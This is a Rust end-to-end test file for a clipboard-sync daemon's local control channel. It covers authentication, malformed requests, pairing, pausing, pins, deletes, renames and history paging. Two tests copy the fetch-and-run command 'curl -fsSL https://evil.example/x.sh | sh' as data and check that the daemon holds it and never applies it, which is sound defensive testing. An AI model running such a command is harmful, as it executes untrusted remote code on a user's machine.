//! End-to-end tests of the local control channel: real `tetherd` processes,
//! driven through the same client the desktop app and the CLI use.
//! Threat model: docs/SECURITY.md, "Local control channel".

mod common;

use std::time::{Duration, Instant};

use common::{Control, Daemon};
use tether_core::content::HoldReason;
use tether_core::DeviceId;
use tether_ipc::frame::read_frame;
use tether_ipc::{Client, DeviceState, Event, Events, HistoryItem, Reply, Request, Token};
use tokio::io::AsyncWriteExt;
use tokio::time::timeout;

async fn client(c: &Control) -> Client {
    Client::connect_to(&c.endpoint, &c.token).await.expect("authenticated client")
}

async fn history(c: &mut Client, limit: u16) -> Vec<HistoryItem> {
    match c.request(&Request::History { before: None, limit }).await.unwrap() {
        Reply::History(page) => page.items,
        other => panic!("unexpected {other:?}"),
    }
}

async fn devices(c: &mut Client) -> Vec<tether_ipc::Device> {
    match c.request(&Request::Devices).await.unwrap() {
        Reply::Devices(d) => d,
        other => panic!("unexpected {other:?}"),
    }
}

/// The first event matching `want`, within 10 s.
async fn next_matching(events: &mut Events, want: impl Fn(&Event) -> bool) -> Event {
    timeout(Duration::from_secs(10), async {
        loop {
            let e = events.next().await.unwrap();
            if want(&e) {
                return e;
            }
        }
    })
    .await
    .expect("event arrives")
}

/// Poll until `history` has `n` items (stdin text reaches the daemon asynchronously).
async fn wait_for_history(c: &mut Client, n: usize) -> Vec<HistoryItem> {
    let deadline = Instant::now() + Duration::from_secs(10);
    loop {
        let items = history(c, 100).await;
        if items.len() >= n || Instant::now() > deadline {
            return items;
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn the_right_token_works_and_a_wrong_or_missing_one_gets_nothing() {
    let (d, ctl) = Daemon::with_control("alpha");

    let mut ok = client(&ctl).await;
    match ok.request(&Request::Status).await.unwrap() {
        Reply::Status(s) => assert_eq!(s.device.to_hex(), d.id),
        other => panic!("unexpected {other:?}"),
    }

    let wrong = Client::connect_to(&ctl.endpoint, &Token::generate().unwrap()).await.err().expect("refused");
    assert!(format!("{wrong:#}").contains("refused"), "{wrong:#}");

    // A client that never proves anything gets the hello (a nonce), then is
    // closed after the 5 s deadline without another byte.
    let mut silent = tether_ipc::client_stream(&ctl.endpoint).await.unwrap();
    read_frame(&mut silent, 128).await.expect("hello");
    let started = Instant::now();
    let after = timeout(Duration::from_secs(8), read_frame(&mut silent, 1 << 20)).await.expect("closed in time");
    assert!(after.is_err(), "nothing but the hello before authentication");
    assert!(started.elapsed() >= Duration::from_secs(4));

    // The authenticated client still works: failures elsewhere did not disturb it.
    assert!(matches!(ok.request(&Request::Devices).await.unwrap(), Reply::Devices(_)));
}

#[tokio::test(flavor = "multi_thread")]
async fn oversized_and_malformed_requests_close_the_connection() {
    let (_d, ctl) = Daemon::with_control("alpha");
    let mut raw = tether_ipc::authenticated_stream(&ctl.endpoint, &ctl.token).await.unwrap();
    raw.write_all(&(64u32 << 20).to_le_bytes()).await.unwrap(); // claims 64 MiB
    let closed = timeout(Duration::from_secs(5), read_frame(&mut raw, 1 << 20)).await.expect("closed in time");
    assert!(closed.is_err());

    let mut raw = tether_ipc::authenticated_stream(&ctl.endpoint, &ctl.token).await.unwrap();
    raw.write_all(&[3, 0, 0, 0, 0xff, 0xff, 0xff]).await.unwrap(); // not a Request
    let closed = timeout(Duration::from_secs(5), read_frame(&mut raw, 1 << 20)).await.expect("closed in time");
    assert!(closed.is_err());

    // And the daemon is still serving.
    assert!(matches!(client(&ctl).await.request(&Request::Status).await.unwrap(), Reply::Status(_)));
}

#[tokio::test(flavor = "multi_thread")]
async fn too_many_clients_are_refused_until_one_leaves() {
    let (_d, ctl) = Daemon::with_control("alpha");
    let mut held = Vec::new();
    for _ in 0..8 {
        held.push(client(&ctl).await);
    }
    assert!(Client::connect_to(&ctl.endpoint, &ctl.token).await.is_err(), "a ninth client is refused");
    drop(held.pop());
    let deadline = Instant::now() + Duration::from_secs(5);
    loop {
        if Client::connect_to(&ctl.endpoint, &ctl.token).await.is_ok() {
            break;
        }
        assert!(Instant::now() < deadline, "a slot frees up when a client leaves");
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
}

#[test]
fn a_second_daemon_cannot_take_the_profile() {
    let (_d, ctl) = Daemon::with_control("alpha");
    let out = Daemon::run_to_exit("beta", &["--profile", &ctl.profile], &Token::generate().unwrap());
    let text = String::from_utf8_lossy(&out.stderr).to_string() + &String::from_utf8_lossy(&out.stdout);
    assert!(!out.status.success(), "the second daemon must not start:\n{text}");
    assert!(text.contains("cannot open the control channel"), "{text}");
}

#[tokio::test(flavor = "multi_thread")]
async fn two_daemons_pair_sync_and_revoke_through_the_channel() {
    let (_a, ctl_a) = Daemon::with_control("alpha");
    let (mut b, ctl_b) = Daemon::with_control("bravo");
    let (mut ca, mut cb) = (client(&ctl_a).await, client(&ctl_b).await);
    let mut events = client(&ctl_a).await.subscribe().await.unwrap();

    let Reply::PairCode(code) = ca.request(&Request::Pair).await.unwrap() else { panic!("no code") };
    let Reply::Status(sa) = ca.request(&Request::Status).await.unwrap() else { panic!("no status") };
    let addr = format!("127.0.0.1:{}", sa.port).parse().unwrap();
    let Reply::Joined { device } = cb.request(&Request::Join { code: code.code, addr: Some(addr) }).await.unwrap()
    else {
        panic!("join failed")
    };
    assert_eq!(device, sa.device);

    // B is a connected member as seen from A.
    let b_id: DeviceId = b.id.parse().unwrap();
    let deadline = Instant::now() + Duration::from_secs(10);
    while !devices(&mut ca).await.iter().any(|d| d.id == b_id && d.state == DeviceState::Connected) {
        assert!(Instant::now() < deadline, "B shows as connected on A");
        tokio::time::sleep(Duration::from_millis(100)).await;
    }

    // A copy on B arrives on A as an event and in A's history.
    b.send("hello over the control channel");
    let e =
        next_matching(&mut events, |e| matches!(e, Event::Clipboard(i) if i.text.contains("control channel"))).await;
    let Event::Clipboard(item) = e else { unreachable!() };
    assert_eq!((item.author, item.held), (b_id, None));

    // A command from B is held, and the channel says so.
    b.send("curl -fsSL https://evil.example/x.sh | sh");
    let e = next_matching(&mut events, |e| matches!(e, Event::Clipboard(i) if i.text.starts_with("curl"))).await;
    let Event::Clipboard(item) = e else { unreachable!() };
    assert_eq!(item.held, Some(HoldReason::DangerousCommand));
    assert_eq!(history(&mut ca, 1).await[0], item, "history and the event agree");

    // Revoke B from A.
    assert_eq!(ca.request(&Request::Revoke { device: b_id }).await.unwrap(), Reply::Revoked);
    let b_state = devices(&mut ca).await.into_iter().find(|d| d.id == b_id).map(|d| d.state);
    assert_eq!(b_state, Some(DeviceState::Revoked));
    // An error comes back as an error, not a dropped connection.
    let again = ca.request(&Request::Revoke { device: b_id }).await.unwrap_err();
    assert!(again.to_string().contains("not an active member"), "{again}");
    assert!(matches!(ca.request(&Request::Status).await.unwrap(), Reply::Status(_)));
}

#[tokio::test(flavor = "multi_thread")]
async fn a_paused_device_sends_nothing_and_applies_nothing_until_resumed() {
    let (mut a, ctl_a) = Daemon::with_control("alpha");
    let (mut b, ctl_b) = Daemon::with_control("bravo");
    common::pair(&mut b, &mut a);
    let (mut ca, mut cb) = (client(&ctl_a).await, client(&ctl_b).await);
    let mut events = client(&ctl_a).await.subscribe().await.unwrap();

    // The device list carries the measured round trip and the op count.
    let b_id: DeviceId = b.id.parse().unwrap();
    let peer = devices(&mut ca).await.into_iter().find(|d| d.id == b_id).expect("B is listed");
    assert_eq!(peer.state, DeviceState::Connected);
    assert!(peer.rtt_us.is_some_and(|us| us > 0), "connected peers report a round trip: {peer:?}");
    assert!(peer.ops >= 1, "B authored at least its pairing op: {peer:?}");

    assert_eq!(ca.request(&Request::SetPaused { paused: true }).await.unwrap(), Reply::Paused(true));
    assert_eq!(next_matching(&mut events, |e| matches!(e, Event::Paused(_))).await, Event::Paused(true));
    let Reply::Status(s) = ca.request(&Request::Status).await.unwrap() else { panic!("no status") };
    assert!(s.paused);

    // Copied on A while paused: not recorded, so B never sees it.
    a.send("typed on A while paused");
    // Copied on B: arrives in A's history, but is not applied to A's clipboard.
    let m = a.mark();
    b.send("from B while A is paused");
    next_matching(&mut events, |e| matches!(e, Event::Clipboard(i) if i.text == "from B while A is paused")).await;
    common::settle();
    assert!(!a.since(m).contains("<< from B"), "applied while paused:\n{}", a.since(m));
    let texts = |items: Vec<HistoryItem>| items.into_iter().map(|i| i.text).collect::<Vec<_>>();
    assert!(!texts(history(&mut ca, 100).await).contains(&"typed on A while paused".to_string()));
    assert!(!texts(history(&mut cb, 100).await).contains(&"typed on A while paused".to_string()));

    // Resumed: B's next copy is applied again, and A's copies sync.
    assert_eq!(ca.request(&Request::SetPaused { paused: false }).await.unwrap(), Reply::Paused(false));
    let m = a.mark();
    b.send("after resuming");
    a.wait_for("<< after resuming", m).expect("applied after resuming");
    a.send("typed on A after resuming");
    assert!(texts(wait_for_history(&mut cb, 3).await).contains(&"typed on A after resuming".to_string()));
}

#[tokio::test(flavor = "multi_thread")]
async fn pins_and_deletes_reach_every_device() {
    let (mut a, ctl_a) = Daemon::with_control("alpha");
    let (mut b, ctl_b) = Daemon::with_control("bravo");
    common::pair(&mut b, &mut a);
    let (mut ca, mut cb) = (client(&ctl_a).await, client(&ctl_b).await);
    let mut events_a = client(&ctl_a).await.subscribe().await.unwrap();

    a.send("pin me");
    a.send("delete me");
    let b_items = wait_for_history(&mut cb, 2).await;
    let find = |items: &[HistoryItem], text: &str| items.iter().find(|i| i.text == text).cloned().expect(text);
    let (keep, gone) = (find(&b_items, "pin me"), find(&b_items, "delete me"));

    // B pins A's copy; A hears about it and shows it pinned.
    let pin = Request::SetPinned { author: keep.author, seq: keep.seq, pinned: true };
    assert_eq!(cb.request(&pin).await.unwrap(), Reply::Marked);
    let e = next_matching(&mut events_a, |e| matches!(e, Event::ItemChanged { seq, .. } if *seq == keep.seq)).await;
    assert_eq!(e, Event::ItemChanged { author: keep.author, seq: keep.seq, pinned: true, deleted: false });
    assert!(find(&history(&mut ca, 100).await, "pin me").pinned);

    // A deletes the other one; it leaves both histories, and cannot be marked again.
    assert_eq!(ca.request(&Request::Delete { author: gone.author, seq: gone.seq }).await.unwrap(), Reply::Marked);
    let deadline = Instant::now() + Duration::from_secs(10);
    while history(&mut cb, 100).await.iter().any(|i| i.text == "delete me") {
        assert!(Instant::now() < deadline, "the delete reaches B");
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    assert!(!history(&mut ca, 100).await.iter().any(|i| i.text == "delete me"));
    let again = cb.request(&Request::Delete { author: gone.author, seq: gone.seq }).await.unwrap_err();
    assert!(again.to_string().contains("not in history"), "{again}");
    let missing = ca.request(&Request::SetPinned { author: keep.author, seq: 999, pinned: true }).await.unwrap_err();
    assert!(missing.to_string().contains("not in history"), "{missing}");
    assert!(find(&history(&mut cb, 100).await, "pin me").pinned, "the pin survives the delete of another item");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_rename_reaches_every_device_including_the_renamed_one() {
    let (mut a, ctl_a) = Daemon::with_control("alpha");
    let (mut b, ctl_b) = Daemon::with_control("bravo");
    common::pair(&mut b, &mut a);
    let (mut ca, mut cb) = (client(&ctl_a).await, client(&ctl_b).await);
    let mut events_b = client(&ctl_b).await.subscribe().await.unwrap();
    let b_id: DeviceId = b.id.parse().unwrap();

    // Control and direction characters are dropped before the rename is signed.
    let rename = Request::Rename { device: b_id, name: "  Work\u{1b}[31m laptop\u{202E}  ".into() };
    assert_eq!(ca.request(&rename).await.unwrap(), Reply::Renamed);
    next_matching(&mut events_b, |e| matches!(e, Event::DevicesChanged)).await;
    let deadline = Instant::now() + Duration::from_secs(10);
    loop {
        let Reply::Status(s) = cb.request(&Request::Status).await.unwrap() else { panic!("no status") };
        if s.name == "Work[31m laptop" {
            break;
        }
        assert!(Instant::now() < deadline, "B takes its new name, got {:?}", s.name);
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    let name_on = |list: Vec<tether_ipc::Device>| list.into_iter().find(|d| d.id == b_id).map(|d| d.name);
    assert_eq!(name_on(devices(&mut ca).await).as_deref(), Some("Work[31m laptop"));
    assert_eq!(name_on(devices(&mut cb).await).as_deref(), Some("Work[31m laptop"));

    let empty = ca.request(&Request::Rename { device: b_id, name: " \u{7} ".into() }).await.unwrap_err();
    assert!(empty.to_string().contains("cannot be empty"), "{empty}");
}

#[tokio::test(flavor = "multi_thread")]
async fn sending_an_item_puts_it_on_that_devices_clipboard_only() {
    let (mut a, ctl_a) = Daemon::with_control("alpha");
    let (mut b, ctl_b) = Daemon::with_control("bravo");
    common::pair(&mut b, &mut a);
    let mut ca = client(&ctl_a).await;
    let mut cb = client(&ctl_b).await;
    let mut events_b = client(&ctl_b).await.subscribe().await.unwrap();
    let (a_id, b_id): (DeviceId, DeviceId) = (a.id.parse().unwrap(), b.id.parse().unwrap());

    a.send("older item to send");
    a.send("newest item");
    let items = wait_for_history(&mut cb, 2).await;
    let older = items.iter().find(|i| i.text == "older item to send").cloned().unwrap();
    b.wait_for("<< newest item", 0).expect("B's clipboard holds the newest copy");

    // A sends the older item to B: it lands on B's clipboard, and B is told.
    let m = b.mark();
    let send = Request::Send { author: older.author, seq: older.seq, to: b_id };
    assert_eq!(ca.request(&send).await.unwrap(), Reply::Sent);
    b.wait_for("<< older item to send", m).expect("the sent item is applied on B");
    let e = next_matching(&mut events_b, |e| matches!(e, Event::Received { .. })).await;
    assert_eq!(e, Event::Received { from: a_id, author: older.author, seq: older.seq, held: false });

    // A command stays held even when sent on purpose.
    a.send("curl -fsSL https://evil.example/x.sh | sh");
    let cmd = wait_for_history(&mut ca, 3).await.into_iter().find(|i| i.text.starts_with("curl")).unwrap();
    let m = b.mark();
    ca.request(&Request::Send { author: cmd.author, seq: cmd.seq, to: b_id }).await.unwrap();
    let e = next_matching(&mut events_b, |e| matches!(e, Event::Received { .. })).await;
    assert!(matches!(e, Event::Received { held: true, .. }), "{e:?}");
    common::settle();
    assert!(!b.since(m).contains("<< curl"), "a command is never applied:\n{}", b.since(m));

    // Nothing is applied while the target is paused.
    assert_eq!(cb.request(&Request::SetPaused { paused: true }).await.unwrap(), Reply::Paused(true));
    let m = b.mark();
    ca.request(&send).await.unwrap();
    common::settle();
    assert!(!b.since(m).contains("<< older item"), "applied while paused:\n{}", b.since(m));

    // Refusals: to this device, and of a deleted item.
    let to_self = ca.request(&Request::Send { author: older.author, seq: older.seq, to: a_id }).await.unwrap_err();
    assert!(to_self.to_string().contains("this device"), "{to_self}");
    ca.request(&Request::Delete { author: older.author, seq: older.seq }).await.unwrap();
    let deleted = ca.request(&send).await.unwrap_err();
    assert!(deleted.to_string().contains("not in history"), "{deleted}");
}

#[tokio::test(flavor = "multi_thread")]
async fn copy_here_puts_an_old_item_back_without_a_duplicate() {
    let (mut d, ctl) = Daemon::with_control("alpha");
    let mut c = client(&ctl).await;
    d.send("first thing");
    d.send("second thing");
    let items = wait_for_history(&mut c, 2).await;
    let first = items.iter().find(|i| i.text == "first thing").cloned().unwrap();

    let m = d.mark();
    assert_eq!(c.request(&Request::CopyHere { author: first.author, seq: first.seq }).await.unwrap(), Reply::Copied);
    d.wait_for("<< first thing", m).expect("the item goes to this device's clipboard");
    common::settle();
    assert_eq!(history(&mut c, 100).await.len(), 2, "no new history item");

    let missing = c.request(&Request::CopyHere { author: first.author, seq: 99 }).await.unwrap_err();
    assert!(missing.to_string().contains("not in history"), "{missing}");
}

#[test]
fn a_managed_daemon_stops_cleanly_when_its_app_goes_away() {
    let (mut d, _ctl) = Daemon::managed("alpha");
    let m = d.mark();
    let status = d.close_stdin_and_wait(Duration::from_secs(10)).expect("exits once stdin closes");
    assert!(status.success(), "clean exit: {status:?}\n{}", d.since(0));
    assert!(d.since(m).contains("shutting down"), "{}", d.since(m));
}

#[tokio::test(flavor = "multi_thread")]
async fn history_pages_without_gaps_or_repeats() {
    let (mut d, ctl) = Daemon::with_control("alpha");
    let mut c = client(&ctl).await;
    for i in 0..5 {
        d.send(&format!("item {i}"));
    }
    assert_eq!(wait_for_history(&mut c, 5).await.len(), 5);

    let (mut seen, mut before, mut pages) = (Vec::new(), None, 0);
    loop {
        let Reply::History(page) = c.request(&Request::History { before, limit: 2 }).await.unwrap() else {
            panic!("no page")
        };
        pages += 1;
        assert!(page.items.len() <= 2);
        seen.extend(page.items.into_iter().map(|i| i.text));
        match page.next {
            Some(next) => before = Some(next),
            None => break,
        }
    }
    assert_eq!(pages, 3);
    assert_eq!(seen, ["item 4", "item 3", "item 2", "item 1", "item 0"]);
}
